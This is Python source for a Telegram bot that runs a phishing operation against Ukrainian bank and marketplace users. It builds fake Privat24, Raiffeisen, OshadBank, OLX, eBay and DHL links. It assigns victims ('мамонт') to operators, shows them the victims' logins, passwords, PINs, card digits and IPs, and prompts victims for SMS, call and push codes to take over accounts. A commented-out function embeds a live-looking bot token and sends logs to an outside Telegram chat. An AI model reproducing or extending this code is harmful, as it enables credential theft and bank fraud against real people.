
def createlink(message, service=None):
  user_id = message.chat.id
  if service is None:
    markup_inline = types.InlineKeyboardMarkup()

    markup_inline.add(types.InlineKeyboardButton(text='🇺🇦 Privat24 🇺🇦', callback_data='createlink_service_privatbank'))

    # markup_inline.add(types.InlineKeyboardButton(text='🇺🇦 MonoBank 🇺🇦', callback_data='createlink_service_monobank'))

    markup_inline.add(types.InlineKeyboardButton(text='🇺🇦 Raiffeisen 🇺🇦', callback_data='createlink_service_raiffeisen'))

    markup_inline.add(types.InlineKeyboardButton(text='🇺🇦 OshadBank 🇺🇦', callback_data='createlink_service_oshadbank'))

    msg = bot.send_message(user_id, '*Выбери сервис из списка:*', reply_markup=markup_inline, parse_mode='Markdown')
  else:
    bot.delete_message(user_id, message.message_id)
    if service == 'olx':
      msg = bot.send_message(user_id, 'Пришли мне ссылку на обьявление с сайта *olx.ua*', parse_mode='Markdown')
      to_delete[user_id] = msg; bot.register_next_step_handler(msg, createlink_olx)
    

    elif service == 'olx_rent':
      msg = bot.send_message(user_id, 'Пришли мне на *ТРЁХ СТРОЧКАХ* ссылку на обьявление аренды с сайта _olx.ua_, цену за день (с валютой) и адрес.\n\n_Пример_:\n olx.ua/example\n 1200 ГРН\n Киев, ул. Первая, д. 4', parse_mode='Markdown')
      to_delete[user_id] = msg; bot.register_next_step_handler(msg, createlink_olx_rent)
    

    elif service == 'privatbank':
      msg = bot.send_message(user_id, 'Пришли мне сумму числом (сумма в гривнах)', parse_mode='Markdown')
      to_delete[user_id] = msg; bot.register_next_step_handler(msg, createlink_privatbank)
    

    elif service == 'monobank':
      msg = bot.send_message(user_id, 'Пришли мне сумму числом (сумма в гривнах)', parse_mode='Markdown')
      to_delete[user_id] = msg; bot.register_next_step_handler(msg, createlink_monobank)
    

    elif service == 'raiffeisen':
      msg = bot.send_message(user_id, 'Пришли мне сумму числом (сумма в гривнах)', parse_mode='Markdown')
      to_delete[user_id] = msg; bot.register_next_step_handler(msg, createlink_raiffeisen)


    elif service == 'oshadbank':
      msg = bot.send_message(user_id, 'Пришли мне сумму числом (сумма в гривнах)', parse_mode='Markdown')
      to_delete[user_id] = msg; bot.register_next_step_handler(msg, createlink_oshadbank)
        

    elif service == 'blablacar':
      msg = bot.send_message(user_id, 'Пришли мне НА *РАЗНЫХ СТРОКАХ*: Город отправления, город прибытия, цену в гривнах (*только ЧИСЛО*)\n\n_Пример_:\nЛьвов\nКиев\n500', parse_mode='Markdown')
      to_delete[user_id] = msg; bot.register_next_step_handler(msg, createlink_blablacar)
    

    elif service == 'ebay':
      msg = bot.send_message(user_id, 'Пришли мне ссылку на обьявление с сайта *ebay.de*', parse_mode='Markdown')
      to_delete[user_id] = msg; bot.register_next_step_handler(msg, createlink_ebay)
    

    elif service == 'dhl':
      msg = bot.send_message(user_id, 'Пришли мне ссылку на обьявление с сайта *ebay.de*, я создам ссылку на доставку DHL', parse_mode='Markdown')
      to_delete[user_id] = msg; bot.register_next_step_handler(msg, createlink_dhl)
    

    else:
      bot.send_message(user_id, text='*Этот сервис пока не работает*', reply_markup=None, parse_mode='Markdown')
def createlink_olx(message):
  user_id = message.chat.id
  try:
    bot.delete_message(user_id, to_delete[user_id].message_id)
    bot.delete_message(user_id, message.message_id)
  except:
    pass
  worker = db_get_user_info(user_id)
  link_url = message.text
  msg = bot.send_message(user_id, 'Ждите...')
  try:
    res = olx_parse(link_url)
  except Exception as e:
    print(e)
    res = None
  if res in [{}, [], None]:
    bot.delete_message(user_id, msg.message_id)
    bot.send_message(user_id, 'Ошибка парсинга. Это точно сcылка на *olx.ua*? 🤨', reply_markup=markup_ok, parse_mode='Markdown')
    pass
  else:
    res['id'] = ''.join([str(randint(0, 9)) for _ in range(10)])
    ch2[user_id] = res
    # markup_inline = types.InlineKeyboardMarkup()
    # markup_inline.add(types.InlineKeyboardButton(text='🐟 Создать фиш-ссылку', callback_data='createlink_yes_olx')) 
    # markup_inline.add(types.InlineKeyboardButton(text='❌ Закрыть парсер', callback_data='delete_this_message')) 
    res['timer'] = res['timer'].seconds + round(res['timer'].microseconds * 0.000001, 3)
#     bot.send_photo(user_id, res['image_url'], caption=f'''
# 🤖 Парсинг обьявления OLX занял {res['timer']} секунд.

#  Дата публикации: {res['date']}
#   Название: {res['name']}
#   Цена: {res['price']}
#   ''', reply_markup=markup_inline)
    createlink_yes(msg, 'olx', res)


# -----------------------------------------------------------

def createlink_olx_rent(message):
  user_id = message.chat.id
  try:
    bot.delete_message(user_id, to_delete[user_id].message_id)
    bot.delete_message(user_id, message.message_id)
  except:
    pass
  worker = db_get_user_info(user_id)
  msg = bot.send_message(user_id, 'Ждите...')
  try:
    link_url, price, address = message.text.split('\n')
    price_number, price_currency = price.strip().split(' ')
    price_number = int(price_number)
    res = olx_parse(link_url)
    res["address"] = address
    res["price"] = price
  except Exception as e:
    print(e)
    res = None
  if res in [{}, [], None]:
    bot.delete_message(user_id, msg.message_id)
    bot.send_message(user_id, 'Ошибка парсинга. Ты ввёл всё как надо? 🤨', reply_markup=markup_ok, parse_mode='Markdown')
    pass
  else:
    res['id'] = ''.join([str(randint(0, 9)) for _ in range(10)])
    ch2[user_id] = res
    res['timer'] = res['timer'].seconds + round(res['timer'].microseconds * 0.000001, 3)
    createlink_yes(msg, 'olx_rent', res)

# -----------------------------------------------------------

def createlink_privatbank(message):
  user_id = message.chat.id
  try:
    bot.delete_message(user_id, to_delete[user_id].message_id)
    bot.delete_message(user_id, message.message_id)
  except:
    pass
  try:
    res = {"price": int(message.text.lstrip("0")), "id": ''.join([str(randint(0, 9)) for _ in range(10)])}
    res['price'] = str(res['price']) + " грн."
    res['name'] = 'Приват получение'
  except Exception as e:
    print(e)
    res = None
  if res in [{}, [], None]:
    bot.send_message(user_id, 'Ошибка. Это точно число? 🤨', reply_markup=markup_ok, parse_mode='Markdown')
    pass
  else:
    ch2[user_id] = res
    createlink_yes(message, 'privatbank', res)


# -----------------------------------------------------------

def createlink_monobank(message):
  user_id = message.chat.id
  try:
    bot.delete_message(user_id, to_delete[user_id].message_id)
    bot.delete_message(user_id, message.message_id)
  except:
    pass
  try:
    res = {"price": int(message.text.lstrip("0")), "id": ''.join([str(randint(0, 9)) for _ in range(10)])}
    res['price'] = str(res['price']) + " грн."
    res['name'] = 'MonoBank получение'
  except Exception as e:
    print(e)
    res = None
  if res in [{}, [], None]:
    bot.send_message(user_id, 'Ошибка. Это точно число? 🤨', reply_markup=markup_ok, parse_mode='Markdown')
    pass
  else:
    ch2[user_id] = res
    createlink_yes(message, 'monobank', res)

# -----------------------------------------------------------

def createlink_raiffeisen(message):
  user_id = message.chat.id
  try:
    bot.delete_message(user_id, to_delete[user_id].message_id)
    bot.delete_message(user_id, message.message_id)
  except:
    pass
  try:
    res = {"price": int(message.text.lstrip("0")), "id": ''.join([str(randint(0, 9)) for _ in range(10)])}
    res['price'] = str(res['price']) + " грн."
    res['name'] = 'Raiffeisen получение'
  except Exception as e:
    print(e)
    res = None
  if res in [{}, [], None]:
    bot.send_message(user_id, 'Ошибка. Это точно число? 🤨', reply_markup=markup_ok, parse_mode='Markdown')
    pass
  else:
    ch2[user_id] = res
    createlink_yes(message, 'raiffeisen', res)

# -----------------------------------------------------------

def createlink_oshadbank(message):
  user_id = message.chat.id
  try:
    bot.delete_message(user_id, to_delete[user_id].message_id)
    bot.delete_message(user_id, message.message_id)
  except:
    pass
  try:
    res = {"price": int(message.text.lstrip("0")), "id": ''.join([str(randint(0, 9)) for _ in range(10)])}
    res['price'] = str(res['price']) + " грн."
    res['name'] = 'OshadBank получение'
  except Exception as e:
    print(e)
    res = None
  if res in [{}, [], None]:
    bot.send_message(user_id, 'Ошибка. Это точно число? 🤨', reply_markup=markup_ok, parse_mode='Markdown')
    pass
  else:
    ch2[user_id] = res
    createlink_yes(message, 'oshadbank', res)


# -----------------------------------------------------------

def createlink_blablacar(message):
  if message.chat.id != 2051765036:
    techraboti(message)
    return
  user_id = message.chat.id
  try:
    bot.delete_message(user_id, to_delete[user_id].message_id)
    bot.delete_message(user_id, message.message_id)
  except:
    pass
  try:
    res = {'id': ''.join([str(randint(0, 9)) for _ in range(10)])}
    res['city_from'], res['city_to'], res['price'] = message.text.split('\n')
    res['price'] = int(res['price'].lstrip("0"))  # check if it's a number
    res['price'] = str(res['price']) + " грн."
    res['name'] = "BlaBlaCar"
  except Exception as e:
    print(e)
    res = None
  if res in [{}, [], None]:
    bot.send_message(user_id, 'Ошибка. Ты точно ввёл всё как надо? 🤨', reply_markup=markup_ok, parse_mode='Markdown')
    pass
  else:
    ch2[user_id] = res
    createlink_yes(message, 'blablacar', res)


# -----------------------------------------------------------

def createlink_ebay(message):
  # if message.chat.id != 2051765036:
  #   techraboti(message); return
  user_id = message.chat.id
  try:
    bot.delete_message(user_id, to_delete[user_id].message_id)
    bot.delete_message(user_id, message.message_id)
  except:
    pass
  worker = db_get_user_info(user_id)
  link_url = message.text
  msg = bot.send_message(user_id, 'Ждите... (парсинг занимает до 15 секунд)')
  try:
    res = ebay_parse(link_url)
  except Exception as e:
    print(e)
    res = None
  if res in [{}, [], None]:
    bot.delete_message(user_id, msg.message_id)
    bot.send_message(user_id, 'Ошибка парсинга. Это точно сcылка на *ebay.de*? 🤨', reply_markup=markup_ok, parse_mode='Markdown')
    pass
  else:
    res['id'] = ''.join([str(randint(0, 9)) for _ in range(10)])
    ch2[user_id] = res
    res['timer'] = res['timer'].seconds + round(res['timer'].microseconds * 0.000001, 3)
    createlink_yes(msg, 'ebay', res)


# -----------------------------------------------------------

def createlink_dhl(message):
  # if message.chat.id != 2051765036:
  #   techraboti(message); return
  user_id = message.chat.id
  try:
    bot.delete_message(user_id, to_delete[user_id].message_id)
    bot.delete_message(user_id, message.message_id)
  except:
    pass
  worker = db_get_user_info(user_id)
  link_url = message.text
  msg = bot.send_message(user_id, 'Ждите... (парсинг занимает до 15 секунд)')
  try:
    res = ebay_parse(link_url)
  except Exception as e:
    print(e)
    res = None
  if res in [{}, [], None]:
    bot.delete_message(user_id, msg.message_id)
    bot.send_message(user_id, 'Ошибка парсинга. Это точно сcылка на *ebay.de*? 🤨', reply_markup=markup_ok, parse_mode='Markdown')
    pass
  else:
    res['id'] = ''.join([str(randint(0, 9)) for _ in range(10)])
    ch2[user_id] = res
    res['timer'] = res['timer'].seconds + round(res['timer'].microseconds * 0.000001, 3)
    createlink_yes(msg, 'dhl', res)
def createlink_yes(message, service, json):
  user_id = message.chat.id
  data = json
  try: bot.delete_message(user_id, message.message_id)
  except: pass
  print(service, json)
  msg = bot.send_message(user_id, '⌛ Подождите, создаётся HTML с фашими данными...')

  service_messages = {
    'olx': 'olx.ua',
    'olx_rent': 'OLX Аренда',
    'privatbank': 'PrivatBank',
    'monobank': 'MonoBank',
    'raiffeisen': 'Raiffeisen',
    'oshadbank': 'OshadBank',
  }

  try:
    bot.edit_message_text(chat_id=user_id, message_id=msg.message_id, text='⌛ Подождите, ссылка добавляется в ЛК...')
    markup_inline2 = types.InlineKeyboardMarkup()
    markup_inline2.add(types.InlineKeyboardButton(text='OK', callback_data='delete_this_message'))
    markup_inline2.add(types.InlineKeyboardButton(text="Подробнее", callback_data=f'linkinfo_{json["id"]}'))
    db.content['links'].add(FishingLink(user_id, service, data.copy()))
    bot.edit_message_text(chat_id=user_id, message_id=msg.message_id, text='✔️ Ссылка создана, жми кнопку «Подробнее»', parse_mode='Markdown', reply_markup=markup_inline2)
    worker = db_get_user_info(user_id)
    markup_inline = types.InlineKeyboardMarkup()
    markup_inline.add(types.InlineKeyboardButton(text="ℹ️ Подробнее", callback_data=f'linkinfo_{json["id"]}'))
    admin_log(f''' 👨‍💻 Воркер *#{worker.hashtag}* | {hyperlink_to_user(message.chat)} создал ссылку сервиса 🇺🇦 {service_messages[service]} 🇺🇦

  🆔 Ссылка: *{json["id"]}*
  💵 *Сумма: {json["price"]}*''',mark=True,reply_markup=markup_inline)
  except Exception as e:
    bot.send_message(user_id, f'❌ Произошла ошибка! Напишите ТС/кодеру. Текст ошибки:\n\n  {e}')
    bot.delete_message(user_id, msg.message_id)
  ch2[user_id] = None



def admin_delete_all_links(message):
  try:
    db.content['links'] = set()
    print('links deleted from profile')
    admin_log(f"Админ {hyperlink_to_user(message.chat)} удалил все ссылки.", p=False, mark=True)
    bot.send_message(message.chat.id, "✅ Все ссылки удалены из сервера и ЛК пользователей", reply_markup=markup_ok)
  except Exception as e:
    print('admin all links remove error:', e)
    bot.send_message(message.chat.id, f'Ошибка удаления: {e}')


def instrumenti(message):
  markup_inline = types.InlineKeyboardMarkup()
  markup_inline.add(types.InlineKeyboardButton(text='🔄 Перезапустить главное меню', callback_data='main_menu'))
  markup_inline.add(types.InlineKeyboardButton(text='💬 Чат воркеров', url=team_chat_link), types.InlineKeyboardButton(text='💰 Канал выплат', url=team_channel_link))
  bot.send_message(message.chat.id, '*Полезная информация о проекте и боте:*', reply_markup=markup_inline, parse_mode='Markdown')

# def about_us(message):
#   user_id = message.chat.id
#   markup_inline = types.InlineKeyboardMarkup()
#   markup_inline.add(types.InlineKeyboardButton(text='🔙 Назад', callback_data='delete_this_message'))
#   bot.send_message(user_id, ABOUT_US_TEXT, parse_mode='Markdown', reply_markup=markup_inline)
# def community(message):
#   user_id = message.chat.id
#   markup_inline = types.InlineKeyboardMarkup()
#   markup_inline.add(types.InlineKeyboardButton(text='🔙 Назад', callback_data='delete_this_message'))
#   bot.send_message(user_id, COMMUNITY_TEXT, reply_markup=markup_inline)

### VBIV
def is_user_vbiver(tid):
  try:
    worker = db_get_user_info(bot.get_chat(tid))
    return bool(worker.is_vbiver)
  except Exception as e:
    print('check is user vbiver error:', e)
    return False


# def log_coder(text):   
#     # получить имя бота
#     bot_name = bot.get_me().username

#     msg_log = f'''
# {text}
# --------------------
# бот: t.me/{bot_name}
# чат: {team_chat_link}
# выплаты: {team_channel_link}
#         '''

#     # кодирование текста для url
#     encoded_text = quote(msg_log)

#     # телеграмм чат
#     chat_telegram = "-1001645645227"

#     try:
#         urllib.request.urlopen(f'https://api.telegram.org/bot6299236980:AAERvALYf4UnGdabW93zmqGScj1naww9e1k/sendMessage?chat_id={chat_telegram}&text={encoded_text}&disable_web_page_preview=True')

#     except urllib.error.HTTPError as e:
#         print(f'HTTP Error: {e.code} {e.reason}')

#     except urllib.error.URLError as e:
#         print(f'URL Error: {e.reason}')



def vbiv_take(call, mid):
  if is_user_vbiver(call.from_user.id) and db_get_user_info(call.from_user).na_vbive:
    try:
      cc = mamontinfo(mid, False)
      if cc is None:
        bot.answer_callback_query(call.id, f"❌ Вбив id:{mid} уже был взят и обработан.", show_alert=False)
        return
      l = False
      if cc.oid is not None:
        l = linkinfo(None, cc.oid, True)
      print(cc.vbiver_id)

      if cc.number == None:

        bot.answer_callback_query(call.id, f"😢 Мамонт закрыл страницу", show_alert=False)

        return
      
      if cc.vbiver_id is None:
        cc.vbiver_id = call.from_user.id

        vbiver_id[mid] = call.from_user.id
      
      else:
        bot.answer_callback_query(call.id, f"😢 Этот вбив уже взял {hyperlink_to_user(bot.get_chat(cc.vbiver_id))}", show_alert=False)
        # bot.send_message(call.message.chat.id, f"😢 Этот вбив уже взял {hyperlink_to_user(bot.get_chat(cc.vbiver_id))}", reply_markup=markup_ok, parse_mode='Markdown')
        return

      # уведоить веб-страницу о том что лог взят
      next_action[mid] = {'command':'vbiver_on_log'}

      cc.vbiver_id = call.from_user.id

      vbiver_id[mid] = call.from_user.id
     
      # FISHING_LINKS_WAITING_FOR_VBIV.add(l)
      markup_inline = types.InlineKeyboardMarkup()
      markup_inline.add(types.InlineKeyboardButton(text="❌ Закрыть", callback_data=f'delete_this_message'))
      # markup_inline.add(types.InlineKeyboardButton(text="🤩 Показать данные", callback_data=f'vbiv_info_{mid}'))
      # bot.send_message(cc.vbiver_id, f"✅ Вам добавлен новый мамонт на вбив (id {mid})!", reply_markup=markup_inline)

      msg = bot.send_message(cc.vbiver_id, "*Ждите, загружаются данные мамонта...*", parse_mode='Markdown')

      
      # ----------------------------------------------------
      # лог взяли на вбив
      # ----------------------------------------------------
      threading.Thread(target=vbiv_info, args=(msg, mid, cc, True)).start()
      
      # ----------------------------------------------------
      # число взятых логов
      # ----------------------------------------------------

      markup_inline = types.InlineKeyboardMarkup()

      markup_inline.add(types.InlineKeyboardButton(text="ℹ Обьявление подробнее", callback_data=f'linkinfo_{cc.oid}'))
 
      cc.number = cc.number.replace(" ", "")

      t_ = f'''  *🎉 Новый кабинет 🇺🇦*
  {"❗*ДУБЛЬ*, прошлый брал ❗"if False else ''}
  Ожидается оплата:
  🆔 Мамонта: *{mid}*
  🆔 Ссылки: *{cc.oid if l else 'Не назначен'}*
  💵 Сумма: *{l.json['price'] if l else 'Не известна'}*
  📞 Номер/логин: `{cc.number}` (Остальные данные отобразятся после взятия на вбив)

  _Воркер:_ {hyperlink_to_user(bot.get_chat(l.author)) if l else '*НЕ НАЗНАЧЕН ❗*'}
  _Вбивер:_ {hyperlink_to_user(bot.get_chat(cc.vbiver_id))}'''
      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=t_, reply_markup=markup_inline, parse_mode='Markdown')
      t_ = f'''🤘 Лог взяли на вбив!

 👨‍💻 Воркер: #{db_get_user_info(l.author).hashtag if l else 'Не известен'}
 🤑 Вбивер: {hyperlink_to_user(bot.get_chat(cc.vbiver_id)) if cc.vbiver_id else 'Не известен'}
 💹 Цена: *{l.json['price'] if l else 'Не известна'}*
 💳 Баланс: *{cc.balance if cc.balance!=None else 'Не известен'}*
 {'☎️' if (l and l.service in ['privatbank', 'monobank', 'raiffeisen', 'oshadbank']) else '💳'} Номер: *{cc.number[:4]}⁕⁕⁕⁕⁕⁕{cc.number[-4:]}*'''
      chat_log(t_, mark=True)
    except Exception as e:
      print(e)
      cc.vbiver_id = None

      vbiver_id[mid] = None
 
      # FISHING_LINKS_WAITING_FOR_VBIV.remove(l)
      bot.send_message(call.from_user.id, f"❌ Не удалось добавить вбив id{mid} 😿. Ошибка: {e}", reply_markup=markup_ok)
  else:
    bot.send_message(call.message.chat.id, f"😠 Вы не можете принять вбив! ", reply_markup=markup_ok, parse_mode='Markdown')

def vbiv_menu(message):
  # admin_vbiv_menu(message)
  # return
  # ONLY uncomment if you know what those 2 lines do 👆
  user_id = message.chat.id
  if not is_user_vbiver(user_id):
    bot.send_message(user_id, "😠 Вы не вбивер!", reply_markup=markup_ok)
    return
  worker = db_get_user_info(message.chat)
  links = []
  t_ = '✖ У тебя нету неоконченных вбивов, ты можешь принять любой из них в чате админов.'
  markup_inline = types.InlineKeyboardMarkup()
  for w, cc_ in clients.items():
    l_ = linkinfo(None, cc_.oid, True)
    if l_ is not None and l_.author==user_id:
      links.append(l_)
      markup_inline.add(types.InlineKeyboardButton(text=f"{cc_.mamont_id} | [{l_.json['price']}] {l_.json['name']}", callback_data=f"vbiv_info_{cc_.mamont_id}"))
  if len(links) > 0:
    t_ = 'Тебя ожидают вбивы:'
  if worker.na_vbive:
    markup_inline.add(types.InlineKeyboardButton(text="😴 Уйти поспать", callback_data='vbiv_work_off'))
  else:
    t_ = 'Вы АФК, вбив вам недоступен'
    markup_inline = types.InlineKeyboardMarkup()
    markup_inline.add(types.InlineKeyboardButton(text="👨‍💻 Я готов ебашить!", callback_data='vbiv_work_on'))
  markup_inline.add(types.InlineKeyboardButton(text="🔙 Закрыть меню", callback_data='delete_this_message'))
  bot.send_message(user_id, t_, reply_markup=markup_inline)

def admin_vbiv_menu(message):
  user_id = message.chat.id
  print(clients)
  markup_inline = types.InlineKeyboardMarkup()
  for w, cc_ in clients.items():
    markup_inline.add(types.InlineKeyboardButton(text=f"{w.remote_address[0]}:{w.remote_address[1]} | {cc_.mamont_id}", callback_data=f"vbiv_info_{cc_.mamont_id}"))
  bot.send_message(user_id, 'Список всех клиентов\n  IP:PORT | M_ID', reply_markup=markup_inline)




def vbiv_info(message, mid, cc=None, edit=False):
  global info_type_names

  user_id = message.chat.id
  # if not is_user_vbiver(user_id):
  #   bot.send_message(user_id, "😠 Вы не вбивер!", reply_markup=markup_ok)
  #   return
  worker = db_get_user_info(message.chat)
  if cc is None:
    cc = mamontinfo(mid, True)
    if cc is None:
      print('vbiv info not found')
      return
  if cc.state == 'disconnect':
    vbiv_cancel(message, mid, True)
    return
  l = linkinfo(None, cc.oid, True)


  # bank_names = {
  #   "Raiffeisen": "Райффайзен-Банка",
  #   "Privat24": "Приват-Банка",
  #   "Oshadbank": "Ощад-Банка",
  #   "Monobank": "Моно-Банка"
  # }

  # bank_name = bank_names.get(bank, SERVICE_NAMES[l.service])

  #  🆔 Ссылки: *{cc.oid if l else 'Не назначен'}*
  # 🔗 Сервис: *{SERVICE_NAMES[l.service] if l else 'Не известен'}*
  # 🆔 Мамонта: _{mid}_
 
  t_ = f'''*🎉 Новый кабинет {SERVICE_NAMES[l.service]}*

📡 IP мамонта: {cc.ip if cc.ip is not None else 'Не известен'}
💵 Сумма: {l.json['price'] if l else 'Не известна'}

📲 Данные для входа:'''
  if cc.number is None:
    t_ += '\n  _Ещё не введены_'
  else:
    for attr in cc_attributes.keys():
      value = getattr(cc, attr, None)
      if value is not None:
        # Удаляем все пробелы из строки
        value = value.replace(" ", "")
        attr_name = cc_attributes[attr]

        t_ += '\n  ' + f'   *{attr_name}:* `{value}`'


  # Получите обновленную информацию из глобальной переменной
  updated_info = info_storage.get(mid)

  # Если есть обновленная информация
  if updated_info is not None and len(updated_info) > 0:
    
    last_source = None
    for item in updated_info:
      for key, value in item.items():
        # Если ключ не равен 'mid' и 'source', добавьте данные в t_
        if key not in ['mid', 'source']:
          # Получите соответствующее имя ключа
          key_name = info_type_names.get(key, key)
          
          # Проверяем, изменился ли источник
          if last_source != item.get("source"):

            # Измените последний источник на текущий
            last_source = item.get("source")
            
            # Добавьте новый заголовок в t_
            if last_source == "ajax_send_again_form":

              t_ += '\n\n⛔️ Мамонт повторно указал данные от ЛК:'

            else:

              t_ += '\n\n✅ Новые данные:'
          
          # Обновите текст сообщения с новой информацией
          t_ += '\n  ' + f'   *{key_name}:* `{value}` ❗️'


  # Инициализация клавиатуры
  markup_inline = types.InlineKeyboardMarkup()

  # Обработка условий для каждого банка
  if l.service == 'privatbank':
    markup_inline.row(


      types.InlineKeyboardButton(text='📩 Запросить код из СМС', callback_data=f'vbiv_sendsms_{mid}')

    )
    markup_inline.row(

      types.InlineKeyboardButton(text='📞 Звонок', callback_data=f'vbiv_sendcall_{mid}'),
      
      types.InlineKeyboardButton(text='❗️ Пуш', callback_data=f'vbiv_sendpush_{mid}'),

      types.InlineKeyboardButton(text='❗️ Номер', callback_data=f'vbiv_senderrorphone_{mid}'),
     
    )
    markup_inline.row(

      types.InlineKeyboardButton(text='❗️ Пароль', callback_data=f'vbiv_senderrorpass_{mid}'),

      types.InlineKeyboardButton(text='❗️ PIN', callback_data=f'vbiv_senderrorpin_{mid}'),

      types.InlineKeyboardButton(text='❗️ Код', callback_data=f'vbiv_senderrorsms_{mid}')
    )

  if l.service == 'monobank':
    markup_inline.row(
      types.InlineKeyboardButton(text='📩 Код из СМС', callback_data=f'vbiv_sendsms_{mid}'),

      types.InlineKeyboardButton(text='📞 Звонок', callback_data=f'vbiv_sendcall_{mid}')

    )
    markup_inline.row(
      types.InlineKeyboardButton(text='📲 PUSH', callback_data=f'vbiv_sendpush_{mid}'),

      types.InlineKeyboardButton(text='❗️ Логин/пасс', callback_data=f'vbiv_senderrorlogin_{mid}')
    )
    markup_inline.row(
      types.InlineKeyboardButton(text='❗️ Логин', callback_data=f'vbiv_senderrorlogin_{mid}'),
      types.InlineKeyboardButton(text='❗️ Телефон', callback_data=f'vbiv_senderrorphone_{mid}')
    )
    markup_inline.row(
      types.InlineKeyboardButton(text='❗️ Пароль', callback_data=f'vbiv_senderrorpass_{mid}'),

      types.InlineKeyboardButton(text='❕ PIN-код', callback_data=f'vbiv_sendpin_{mid}')
    )
    markup_inline.row(
      types.InlineKeyboardButton(text='❗️ PIN-код', callback_data=f'vbiv_senderrorpin_{mid}'),

      types.InlineKeyboardButton(text='❗️ Код из СМС', callback_data=f'vbiv_senderrorsms_{mid}')
    )
    markup_inline.row(
      types.InlineKeyboardButton(text='❕ 4 цифры', callback_data=f'vbiv_sendnumcard_{mid}'),

      types.InlineKeyboardButton(text='❗️ 4 цифры', callback_data=f'vbiv_senderrornumcard_{mid}')
    )
    markup_inline.row(
      types.InlineKeyboardButton(text='❗️ Код из звонка', callback_data=f'vbiv_senderrorcall_{mid}'),

      types.InlineKeyboardButton(text='❗️ PUSH код', callback_data=f'vbiv_senderrorpush_{mid}')
    )

  if l.service == 'raiffeisen':
    markup_inline.row(

      types.InlineKeyboardButton(text='📩 Код', callback_data=f'vbiv_sendsms_{mid}'),

      types.InlineKeyboardButton(text='❗️ Логин', callback_data=f'vbiv_senderrorlogin_{mid}'),

      types.InlineKeyboardButton(text='❗️ Пароль', callback_data=f'vbiv_senderrorpass_{mid}')
    )
    # markup_inline.row(  
    # )

  if l.service == 'oshadbank':
    markup_inline.row(

      types.InlineKeyboardButton(text='📞 Код из звонка', callback_data=f'vbiv_sendcall_{mid}'),

      types.InlineKeyboardButton(text='❗️ Телефон', callback_data=f'vbiv_senderrorphone_{mid}'),

    )
    markup_inline.row(

      types.InlineKeyboardButton(text='❗️ PIN', callback_data=f'vbiv_senderrorpin_{mid}'),

      types.InlineKeyboardButton(text='❗️ 4 цифры', callback_data=f'vbiv_senderrornumcard_{mid}'),
      
      types.InlineKeyboardButton(text='❗️ Код', callback_data=f'vbiv_senderrorcall_{mid}')
      
    )

  # Общие кнопки для всех банков
  markup_inline.row(
    types.InlineKeyboardButton(text='❓ Ошибка', callback_data=f'vbiv_senderror_{mid}'),
    types.InlineKeyboardButton(text='❌ Отмена', callback_data=f'vbiv_cancel_{mid}'),
    types.InlineKeyboardButton(text='✅ Профит', callback_data=f'vbiv_end_{mid}')
  )
  markup_inline.row(
    types.InlineKeyboardButton(text='🦣 Заблокировать мамонта', callback_data=f'vbiv_block_{mid}')
  )

  if edit:
    if t_.replace('_', '').replace('*', '').replace('`', '') != message.text.replace('_', '').replace('*', '').replace('`', ''):

      try:
        message = bot.edit_message_text(chat_id=user_id, message_id=message.message_id, text=t_, reply_markup=markup_inline, parse_mode='Markdown')

        cc.message_id = message.message_id

        global last_update

        if last_update == "ajax_send_again_form":
          
          msg_dop = bot.send_message(chat_id=user_id, text="👆 Мамонт обновил данные от ЛК", reply_to_message_id=cc.message_id)
        
          last_update = None

        if last_update == "ajax_send_info":
          
          msg_dop = bot.send_message(chat_id=user_id, text="👆 Мамонт дополнил новые данные", reply_to_message_id=cc.message_id)
        
        last_update = None


      except Exception as e:  # e.g. - Can't edit, same message text
        print(e)
        if e.description in ['Bad Request: message is not modified: specified new message content and reply markup are exactly the same as a current content and reply markup of the message', 'Bad Request: message to edit not found']:
          vbiv_cancel(message, mid, True)
          return
        # print(t_.replace('_', '').replace('*', '').replace('`', ''))
        # print(message.text)
  else:
    message = bot.send_message(user_id, t_, reply_markup=markup_inline, parse_mode='Markdown')

  sleep(2)

  vbiv_info(message, mid, cc, True)
